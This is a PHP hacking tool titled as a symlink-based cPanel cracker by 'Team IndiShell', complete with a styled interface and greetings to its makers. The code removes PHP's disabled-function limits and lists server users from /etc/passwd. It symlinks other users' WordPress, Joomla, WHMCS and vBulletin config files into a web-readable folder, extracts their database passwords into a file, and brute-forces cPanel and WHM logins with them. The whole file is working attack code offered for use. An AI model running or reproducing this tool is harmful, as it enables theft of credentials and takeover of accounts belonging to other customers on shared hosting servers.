<?php


$head = '
<html>
<head>
</script>
<title>--==[[ Don,Symlink Based Cpanel Cracker By Team IndiShell]]==--</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<STYLE>
body {
font-family: Tahoma
}
tr {
BORDER: dashed 1px #333;
color: #FFF;
}
td {
BORDER: dashed 1px #333;
color: #FFF;
}
.table1 {
BORDER: 0px Black;
BACKGROUND-COLOR: Black;
color: #FFF;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #333333;
font: 7pt Verdana;
color: Green;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #333333;
color: #FFF;
}
table {
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: Black;
color: #FFF;
}
input {
border : solid 3px ;
border-color : #333;
BACKGROUND-COLOR: white;
font: 11pt Verdana;
color: #333;
}
select {
BORDER-RIGHT: Black 1px solid;
BORDER-TOP: #DF0000 1px solid;
BORDER-LEFT: #DF0000 1px solid;
BORDER-BOTTOM: Black 1px solid;
BORDER-color: #FFF;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: Red;
}
submit {
BORDER: buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 30%;
color: #FFF;
}
textarea {
border : dashed 1px #333;
BACKGROUND-COLOR: Black;
font: Fixedsys bold;
color: #999;
}
BODY {
SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-color: #FFF; SCROLLBAR-SHADOW-color: #FFF; SCROLLBAR-3DLIGHT-color: #FFF; SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-color: #FFF; SCROLLBAR-DARKSHADOW-color: #FFF
margin: 1px;
color: Red;
background-color: Black;
}
.main {
margin : -287px 0px 0px -490px;
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
}
.tt {
background-color: Black;
}

A:link {
COLOR: White; TEXT-DECORATION: none
}
A:visited {
COLOR: White; TEXT-DECORATION: none
}
A:hover {
color: Red; TEXT-DECORATION: none
}
A:active {
color: Red; TEXT-DECORATION: none
}
</STYLE>
<script language=\'javascript\'>
function hide_div(id)
{
document.getElementById(id).style.display = \'none\';
document.cookie=id+\'=0;\';
}
function show_div(id)
{
document.getElementById(id).style.display = \'block\';
document.cookie=id+\'=1;\';
}
function change_divst(id)
{
if (document.getElementById(id).style.display == \'none\')
show_div(id);
else
hide_div(id);
}
</script>'; ?>
<html>
<head>
<?php
echo $head ;
echo '

<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >



<td width="100%" align=center valign="top" rowspan="1"><font color=#ff9933 size=5 face="comic sans ms"><b>--==[[ d0n ]]==--</font><br>
<font color=#ff9933 size=5 face="comic sans ms"><b>--==[[ Symlink Based</font><font color=white size=5 face="comic sans ms"><b> CPanel Cracker By</font><font color=green size=5 face="comic sans ms"><b> Team IndiShell ]]==--</font> <div class="hedr">

<td height="10" align="left" class="td1"></td></tr><tr><td
width="100%" align="center" valign="top" rowspan="1"><font
color="red" face="comic sans ms"size="1"><b>
<font color=#ff9933>
####################################################</font><font color=white>#####################################################</font><font color=green>####################################################</font><br><font color=white>-==[[Greetz to]]==--</font><br><font color=#ff9933> Guru ji zero ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indishell,Baba ,Silent poison India,Magnum sniper,Atul Dwivedi,ethicalnoob Indishell,Local root indishell,Irfninja indishell,cool toad,cool shavik<br>Ebin V Thomas,Dinelson Amine,Th3 D3str0yer,SKSking,Mr. Trojan,rad paul,Godzila,mike waals,zoozoo,cyber warrior,Neo hacker ICA, Golden boy INDIA,Ketan Singh,Yash,Reborn India,Alicks,Aneesh Dogra,silent hacker,lovetherisk<br>Suriya Prakash,cyber gladiator,Cyber Ace,hero,Minhal Mehdi ,Raj bhai ji,cold fire hacker,Mannu, ViKi ,Budhaoo, Bhuppi,Mohit, Ffe ^_^,Ashish,Shardhanand and rest of TEAM INDISHELL<br>

<font color=white>--==[[Dedicated to]]==--</font>
<br># My Father and my Ex Teacher #<br><font color=white>--==[[Interface Desgined By]]==--</font><br><font color=red>GCE College ke DON :D</font><br><font color=#ff9933>
####################################################</font><font color=white>#####################################################</font><font color=green>####################################################</font>

</table>
</table> <div align=center><font color=#ff9933 font size=5><marquee behavior="scroll" direction="left" scrollamount="2" scrolldelay="30" width="70%"><span class="footerlink">love happen only once.....Rest is life......</span></marquee><br></font></div><div align=center><table width=50%><font color=#ff9933 font size=5>--==[[ Code for India,Hack for India,Die for India ]]==--</font></table>

';

?>
<body bgcolor=black><h3 style="text-align:center"><font color=red size=2 face="comic sans ms">
<form method=post>
<input type=submit name=ini value="Generate PHP.ini" /></form>
<?php
if(isset($_POST['ini']))
{

$r=fopen('php.ini','w');
$rr=" disable_functions=none ";
fwrite($r,$rr);
$link="<a href=php.ini><font color=white size=2 face=\"comic sans ms\"><u>open this link in new tab to run PHP.INI</u></font></a>";
echo $link;

}
?>
<p>\\\\\\\\\\\\\\\\\\\\\\\\ Symlink based cpanel cracking wala jugaad XD ///////////////////////
<?php
//////////////////////////////////////
/////    mass symlink       ////////
//////////////////////////////////////
?>
<form method=post>
<input type=submit name="usre" value="click to Extract usernames and mass symlink" /></form>




<?php
if(isset($_POST['usre'])){
?><form method=post>
<textarea rows=10 cols=30 name=user><?php $users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode(":",$user);
echo $str[0]."\n";
}

?></textarea><br><br>
<input type=submit name=su value="bhaiyu ^_^ .. lets start" /></form>
<?php } ?>
<?php
error_reporting(0);
echo "<font color=red size=2 face=\"comic sans ms\">";
if(isset($_POST['su']))
{

$dir=mkdir('IcA',0777);
$r = " Options all \n DirectoryIndex ICA.html \n Require None \n Satisfy Any";
$f = fopen('IcA/.htaccess','w');

fwrite($f,$r);
$consym="<a href=IcA/><font color=white size=3 face=\"comic sans ms\">configuration files</font></a>";
echo "<br>folder where config files has been symlinked<br><u><font color=red size=2 face=\"comic sans ms\">$consym</font></u>";

$usr=explode("\n",$_POST['user']);

foreach($usr as $uss )
{
$us=trim($uss);

$r="IcA/";
symlink('/home/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
symlink('/home/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
symlink('/home/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
symlink('/home/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
symlink('/home/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
symlink('/home/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
symlink('/home/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
symlink('/home/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
symlink('/home/'.$us.'/public_html/config.php',$r.$us.'..config');
symlink('/home/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
symlink('/home/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
symlink('/home/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
symlink('/home/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
symlink('/home/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
symlink('/home/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
symlink('/home/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
symlink('/home/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
symlink('/home/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
symlink('/home/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
symlink('/home/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
symlink('/home/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
symlink('/home/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
}
}
?>
<?php
//////////////////////////////////////
/////password grabbing section////////
//////////////////////////////////////
?>



<form method=post>
<input type=submit name=sm value="start grabbing passwords from configuration files"></form>
<?php
error_reporting(0);
set_time_limit(0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien)
{

$ar0=explode($marqueurDebutLien, $text);
$ar1=explode($marqueurFinLien, $ar0[1]);
$ar=trim($ar1[0]);
return $ar;
}

if(isset($_POST['sm']))

{
echo "bhai ji ... have a cup of tea.. tab tak main is server ki jaan nikalta hoon :P";
$ffile=fopen('r.txt','a+');


$r= 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME'])."/IcA/";
$re=$r;
$confi=array("..wp-config","..word-wp","..wpblog","..config","..admin-conf","..vb","..joomla-or-whmcs","..joomla","..vbinc","..whm","..whmcs","..supporwhmcs","..WHM","..whmc","..WHMcs","..whmcsupp","..whmcs-cli","..whmcs-cl","..whmcs-CL","..whmcs-Cl","..whmcs-csup","..whmcs-bill");

$users=file("/etc/passwd");
foreach($users as $user)
{

$str=explode(":",$user);
$usersss=$str[0];
foreach($confi as $co)
{


$uurl=$re.$usersss.$co;
$uel=$uurl;

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $uel);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8');
$result['EXE'] = curl_exec($ch);
curl_close($ch);
$uxl=$result['EXE'];


if($uxl && preg_match('/table_prefix/i',$uxl))
{

echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='comic sans ms'> $usersss  user's website cms is wordpress </font></td></tr></table>";

 echo $dbp=entre2v2($uxl,"DB_PASSWORD', '","');");
if(!empty($dbp))
$pass=$dbp."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/cc_encryption_hash/i',$uxl))
{

echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='comic sans ms'> $usersss  user's website whmcs bhaiyu xD </font></td></tr></table>";

echo $dbp=entre2v2($uxl,"db_password = '","';");
if(!empty($dbp))
$pass=$dbp."\n";
fwrite($ffile,$pass);

}


elseif($uxl && preg_match('/dbprefix/i',$uxl))
{

echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='comic sans ms'> $usersss  user's  website cms is joomla </font></td></tr></table>";

echo $db=entre2v2($uxl,"password = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/admincpdir/i',$uxl))
{

echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='comic sans ms'> $usersss  user's website cms is vbulletin </font></td></tr></table>";

echo $db=entre2v2($uxl,"password'] = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/DB_DATABASE/i',$uxl))
{

echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='comic sans ms'> got config file for unknwon cms for user $usersss  </font></td></tr></table>";

echo $db=entre2v2($uxl,"DB_PASSWORD', '","');");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='comic sans ms'> $usersss user's config file for unknwon cms </font></td></tr></table>";

echo $db=entre2v2($uxl,"dbpass = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='comic sans ms'> got config file for unknwon cms of user $usersss  </font></td></tr></table>";

echo $db=entre2v2($uxl,"dbpass = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/dbpass/i',$uxl))
{

echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='comic sans ms'> $usersss user's config file for unknwon cms </font></td></tr></table>";

echo $db=entre2v2($uxl,"dbpass = \"","\";");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}


}
}
}
?>
<?php
/////////////////////////////////
/////   cpanel cracker    ///////
/////////////////////////////////
?>


<form method=post>
<input type=submit name=cpanel value="Auto username/password loading cpanel cracker"><p>
<?php

if(isset($_POST['cpanel']))
{
?>
<form method=post><div align=center><table>
want to brute=><select name="op"> <option name="op" value="cp">CPanel</option>
<option name="op" value="whm">WHMPanel</option></table><p>
<textarea style="background:black;color:white" rows=20 cols=25 name=usernames ><?php $users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode(":",$user);
echo $str[0]."\n";
}

?></textarea><textarea style="background:black;color:white" rows=20 cols=25 name=passwords >
<?php

$d=getcwd()."/r.txt";
$pf=file($d);
foreach($pf as $rt)
{
$str=explode('\n',$rt);
echo trim($str[0])."\n";
} ?></textarea><p>
<input type=submit name=cpanelcracking value="kerde khaat khadi >.<"></form>
<?php
}
?>




<?php
error_reporting(0);
$connect_timeout=5;
set_time_limit(0);

$userl=$_POST['usernames'];
$passl=$_POST['passwords'];
$attack=$_POST['op'];
$target = "localhost";

if(isset($_POST['cpanelcracking']))
{
if($userl!=="" && $passl!=="")
{
if($_POST["op"]=="cp")
{
$cracked=$_POST['crack'];
@fopen($cracked,'a');
echo "bhai ji ^_^ ......now we are attacking cpanels....please wait till the end of process \n";


}
elseif($_POST["op"]=="whm")
{
@fopen($cracked,'a');
echo "bhai ji ^_^ ......now we are attacking WHM panel....please wait till the end of process";

}

function cpanel($host,$user,$pass,$timeout){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://$host:2082");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 0 ){
echo "<table width=100% ><tr><td align=center><b><font color=white size=2>==================================</font><font color=red size=2> $user </font><font color=white size=2>cracked with </font><font color=red size=2> $pass </font> <font color=white size=2>==================================</font></b></td></tr></table>";


}

curl_close($ch);}

$userlist=explode("\n",$userl);
$passlist=explode("\n",$passl);

if ($attack == "cp")
{
foreach ($userlist as $user) {
echo "<div align=center><table width=80% ><tr><td align=center><b><font color=red size=1>Attacking user $user </font></td></tr></table>";
$finaluser = trim($user);
foreach ($passlist as $password ) {
$finalpass = trim($password);


cpanel($target,$finaluser,$finalpass,$connect_timeout);

}
}

}

function whm($host,$user,$pass,$timeout){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://$host:2086");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_FAILONERROR, 1);
$data = curl_exec($ch);
if ( curl_errno($ch) == 0 ){
echo "<table width=100% ><tr><td align=center><b><font color=white size=2>==================================</font><font color=red size=2> $user </font><font color=white size=2>cracked with </font><font color=red size=2> $pass </font> <font color=white size=2>==================================</font></b></td></tr></table>";




}


curl_close($ch);}
$userlist=explode("\n",$userl);
$passlist=explode("\n",$passl);

if ($attack == "whm")
{
foreach ($userlist as $user) {
echo "<table width=80% ><tr><td align=center><b><font color=white size=2>user under attack is $user </font></td></tr></table>";
$finaluser = trim($user);
foreach ($passlist as $password ) {
$finalpass = trim($password);

whm($target,$finaluser,$finalpass,$connect_timeout);
}
}
}
}
elseif($userl=="")
{
echo "what are you doing bhai ji :( , you have left userlist field empty";

}
elseif($passl=="")
{

echo "bhai ji :( ... please put passwords in paasword list field";
}
}
?>
